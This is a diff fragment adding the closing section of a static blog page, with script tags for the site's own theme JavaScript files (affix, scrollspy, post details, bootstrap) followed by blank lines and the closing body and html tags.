+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
